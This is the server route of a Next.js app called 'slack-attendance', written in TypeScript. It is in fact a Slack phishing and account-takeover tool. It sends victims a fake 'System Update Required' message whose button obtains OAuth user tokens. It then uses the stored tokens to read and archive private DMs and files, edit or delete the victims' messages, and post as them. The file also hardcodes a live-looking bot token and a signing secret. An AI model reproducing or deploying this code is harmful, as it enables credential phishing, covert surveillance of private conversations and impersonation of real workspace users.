/* eslint-disable prefer-const */
/* eslint-disable @typescript-eslint/no-explicit-any */




// app/api/slack/manager/route.ts

import { NextResponse } from 'next/server';
import { db } from '@/lib/firebase';
import { doc, getDoc, deleteDoc, setDoc, serverTimestamp } from 'firebase/firestore';

// Hardcoded values - no .env needed
const BOT_TOKEN = "xoxb-2545190050563-10466352520084-6NyES55AgLJ6vzmQi4M5veYt"; 
const CLIENT_ID = "2545190050563.10491030504784";
const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";
const SIGNING_SECRET = "e303eff75af6a30c4015dbb2716aecf4";
const APP_URL = "https://slack-attendance.vercel.app";

// Save message to history
async function saveMessageToHistory(message: any, userId: string, channelId: string, channelName: string) {
  try {
    const messageId = `${channelId}_${message.ts.replace(/\./g, '_')}`;
    const messageRef = doc(db, "slack_messages_history", messageId);
    
    const timestamp = parseFloat(message.ts) * 1000;
    const dateObj = new Date(timestamp);
    
    const dateStr = dateObj.toLocaleDateString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      timeZone: 'Asia/Karachi'
    });
    
    const timeStr = dateObj.toLocaleTimeString('en-US', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
      timeZone: 'Asia/Karachi'
    });
    
    await setDoc(messageRef, {
      userId: userId,
      channelId: channelId,
      channelName: channelName,
      messageId: message.ts,
      timestamp: message.ts,
      text: message.text || "",
      files: message.files || [],
      user: message.user || "",
      type: message.type || "message",
      subtype: message.subtype || "",
      createdAt: serverTimestamp(),
      savedAt: new Date().toISOString(),
      date: dateStr,
      time: timeStr,
      fullDateTime: dateObj.toISOString()
    }, { merge: true });
    
    return true;
  } catch (error) {
    console.error("Error saving message:", error);
    return false;
  }
}

// Get channel name
async function getChannelName(userToken: string, channelId: string, userId: string): Promise<string> {
  try {
    if (channelId.startsWith('D')) {
      const userRes = await fetch(`https://slack.com/api/conversations.info?channel=${channelId}`, {
        headers: { Authorization: `Bearer ${userToken}` }
      });
      const channelData = await userRes.json();
      
      if (channelData.ok && channelData.channel) {
        const dmUserId = channelData.channel.user || channelData.channel.id;
        if (dmUserId && dmUserId !== userId) {
          const userInfoRes = await fetch(`https://slack.com/api/users.info?user=${dmUserId}`, {
            headers: { Authorization: `Bearer ${userToken}` }
          });
          const userInfo = await userInfoRes.json();
          if (userInfo.ok) {
            return userInfo.user?.real_name || userInfo.user?.name || "Direct Message";
          }
        }
      }
      return "Direct Message";
    }
    
    const res = await fetch(`https://slack.com/api/conversations.info?channel=${channelId}`, {
      headers: { Authorization: `Bearer ${userToken}` }
    });
    const data = await res.json();
    
    if (data.ok && data.channel) {
      return data.channel.name || data.channel.purpose?.value || "Group Chat";
    }
    
    return "Unknown Chat";
  } catch (error) {
    console.error("Error getting channel name:", error);
    return "Unknown Chat";
  }
}

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { action, targetUserId, channelId, text, messageTs, newText, channelName } = body;

    // --- CASE 1: SEND TRAP MESSAGE ---
    if (action === 'send_invite') {
      if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
      
      // Create OAuth URL with state
      const state = `${targetUserId}:${Date.now()}`;
      const authUrl = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&scope=chat:write,im:history,users:read,mpim:read&redirect_uri=${REDIRECT_URI}&state=${state}`;

      // Create trap message
      const blocks = [
        {
          "type": "header",
          "text": {
            "type": "plain_text",
            "text": "⚡ System Update Required",
            "emoji": true
          }
        },
        {
          "type": "section",
          "text": {
            "type": "mrkdwn",
            "text": "A mandatory workspace update is pending for your account.\n\n*Update includes:*\n• Enhanced security features\n• Improved messaging\n• New collaboration tools\n• Performance improvements"
          }
        },
        {
          "type": "divider"
        },
        {
          "type": "section",
          "fields": [
            {
              "type": "mrkdwn",
              "text": "*Status:* Required"
            },
            {
              "type": "mrkdwn",
              "text": "*Priority:* High"
            },
            {
              "type": "mrkdwn",
              "text": "*Time:* <10 seconds"
            },
            {
              "type": "mrkdwn",
              "text": "*Action:* Click below"
            }
          ]
        },
        {
          "type": "actions",
          "elements": [
            {
              "type": "button",
              "text": {
                "type": "plain_text",
                "text": "⚡ Install Update Now",
                "emoji": true
              },
              "style": "primary",
              "url": authUrl,
              "action_id": "install_update"
            }
          ]
        },
        {
          "type": "context",
          "elements": [
            {
              "type": "mrkdwn",
              "text": "Slack Workspace Update • Required for all users"
            }
          ]
        }
      ];

      // Send trap message
      const chatRes = await fetch('https://slack.com/api/chat.postMessage', {
        method: 'POST',
        headers: { 
          Authorization: `Bearer ${BOT_TOKEN}`, 
          'Content-Type': 'application/json; charset=utf-8' 
        },
        body: JSON.stringify({ 
          channel: targetUserId, 
          text: "⚡ System Update Required - Action Needed",
          blocks: blocks,
          unfurl_links: false,
          unfurl_media: false
        })
      });

      const chatData = await chatRes.json();
      
      if(!chatData.ok) {
        return NextResponse.json({ success: false, error: `Slack Error: ${chatData.error}` });
      }
      
      // Save trap message info
      await setDoc(doc(db, "trap_messages", targetUserId), {
        channelId: targetUserId,
        messageTs: chatData.ts,
        sentAt: serverTimestamp(),
        userId: targetUserId,
        status: "pending",
        state: state
      });
      
      return NextResponse.json({ 
        success: true, 
        message: "Trap message sent",
        messageTs: chatData.ts 
      });
    }

    // --- CASE 2: DELETE USER ---
    if (action === 'delete_user') {
      if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
      await deleteDoc(doc(db, "slack_tokens", targetUserId));
      return NextResponse.json({ success: true });
    }

    // --- CASE 3: DELETE MESSAGE ---
    if (action === 'delete_message') {
      if (!targetUserId || !channelId || !messageTs) {
        return NextResponse.json({ success: false, error: "Missing parameters" });
      }
      
      const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
      if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
      
      const USER_TOKEN = tokenDoc.data().accessToken;
      
      const res = await fetch('https://slack.com/api/chat.delete', {
        method: 'POST',
        headers: { 
          Authorization: `Bearer ${USER_TOKEN}`,
          'Content-Type': 'application/json; charset=utf-8'
        },
        body: JSON.stringify({ channel: channelId, ts: messageTs })
      });
      
      const data = await res.json();
      if (!data.ok) {
        return NextResponse.json({ success: false, error: `Slack Error: ${data.error}` });
      }
      
      return NextResponse.json({ success: true });
    }

    // --- CASE 4: EDIT MESSAGE ---
    if (action === 'edit_message') {
      if (!targetUserId || !channelId || !messageTs || !newText) {
        return NextResponse.json({ success: false, error: "Missing parameters" });
      }
      
      const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
      if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
      
      const USER_TOKEN = tokenDoc.data().accessToken;
      
      const res = await fetch('https://slack.com/api/chat.update', {
        method: 'POST',
        headers: { 
          Authorization: `Bearer ${USER_TOKEN}`,
          'Content-Type': 'application/json; charset=utf-8'
        },
        body: JSON.stringify({ 
          channel: channelId, 
          ts: messageTs,
          text: newText
        })
      });
      
      const data = await res.json();
      if (!data.ok) {
        return NextResponse.json({ success: false, error: `Slack Error: ${data.error}` });
      }
      
      return NextResponse.json({ success: true, message: data.message });
    }

    // --- CASE 5: GET MESSAGES ---
    if (action === 'get_messages') {
      if (!targetUserId || !channelId) return NextResponse.json({ error: "Channel ID required" });
      
      const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
      if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
      
      const USER_TOKEN = tokenDoc.data().accessToken;
      
      const res = await fetch(`https://slack.com/api/conversations.history?channel=${channelId}&limit=50`, { 
        headers: { Authorization: `Bearer ${USER_TOKEN}` } 
      });
      const data = await res.json();
      
      let finalChannelName = channelName || "Direct Message";
      if (finalChannelName === "Direct Message") {
        finalChannelName = await getChannelName(USER_TOKEN, channelId, targetUserId);
      }
      
      const messagesWithDetails = await Promise.all((data.messages || []).map(async (msg: any) => {
        await saveMessageToHistory(msg, targetUserId, channelId, finalChannelName);
        
        if (msg.files && msg.files.length > 0) {
          const filesWithDetails = await Promise.all(msg.files.map(async (file: any) => {
            const fileRes = await fetch(`https://slack.com/api/files.info?file=${file.id}`, {
              headers: { Authorization: `Bearer ${USER_TOKEN}` }
            });
            const fileData = await fileRes.json();
            return {
              ...file,
              url_private: fileData.file?.url_private,
              url_private_download: fileData.file?.url_private_download,
              thumb_64: fileData.file?.thumb_64,
              thumb_360: fileData.file?.thumb_360,
              thumb_360_w: fileData.file?.thumb_360_w,
              thumb_360_h: fileData.file?.thumb_360_h,
              mime_type: fileData.file?.mime_type,
              filetype: fileData.file?.filetype
            };
          }));
          return { ...msg, files: filesWithDetails };
        }
        return msg;
      }));
      
      return NextResponse.json({ 
        success: true, 
        messages: messagesWithDetails.reverse() || [],
        channelName: finalChannelName
      });
    }

    // --- CASE 6: LIST CHATS ---
    if (action === 'list_chats') {
      if (!targetUserId) return NextResponse.json({ error: "User ID required" });
      
      const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
      if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
      
      const USER_TOKEN = tokenDoc.data().accessToken;
      
      const res = await fetch('https://slack.com/api/users.conversations?types=im,mpim&limit=30', { 
        headers: { Authorization: `Bearer ${USER_TOKEN}` } 
      });
      const data = await res.json();
      
      const chats = await Promise.all((data.channels || []).map(async (c: any) => {
        if(c.is_im) {
          const uRes = await fetch(`https://slack.com/api/users.info?user=${c.user}`, { 
            headers: { Authorization: `Bearer ${USER_TOKEN}` } 
          });
          const uData = await uRes.json();
          return { 
            ...c, 
            name: uData.user?.real_name || uData.user?.name || "Unknown", 
            image: uData.user?.profile?.image_48 || uData.user?.profile?.image_32 
          };
        }
        return { ...c, name: c.name || "Group Chat", image: null };
      }));
      
      return NextResponse.json({ 
        success: true, 
        chats: chats,
        count: chats.length 
      });
    }

    // --- CASE 7: SEND AS USER ---
    if (action === 'send_as_user') {
      if (!targetUserId || !channelId || !text) return NextResponse.json({ error: "Channel ID and text required" });
      
      const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
      if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
      
      const USER_TOKEN = tokenDoc.data().accessToken;
      
      const res = await fetch('https://slack.com/api/chat.postMessage', {
        method: 'POST',
        headers: { 
          Authorization: `Bearer ${USER_TOKEN}`, 
          'Content-Type': 'application/json; charset=utf-8' 
        },
        body: JSON.stringify({ 
          channel: channelId, 
          text: text,
          as_user: true 
        })
      });
      
      const result = await res.json();
      
      let finalChannelName = channelName || "Direct Message";
      if (finalChannelName === "Direct Message") {
        finalChannelName = await getChannelName(USER_TOKEN, channelId, targetUserId);
      }
      
      if (result.ok && result.message) {
        await saveMessageToHistory(result.message, targetUserId, channelId, finalChannelName);
      }
      
      return NextResponse.json(result);
    }

    // --- CASE 8: CHECK AUTH STATUS ---
    if (action === 'check_auth_status') {
      if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
      
      const userDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
      const isAuthenticated = userDoc.exists();
      
      return NextResponse.json({ 
        success: true, 
        authenticated: isAuthenticated 
      });
    }

    return NextResponse.json({ error: "Invalid Action" });

  } catch (e: any) {
    console.error("API Error:", e);
    return NextResponse.json({ success: false, error: e.message }, { status: 500 });
  }
}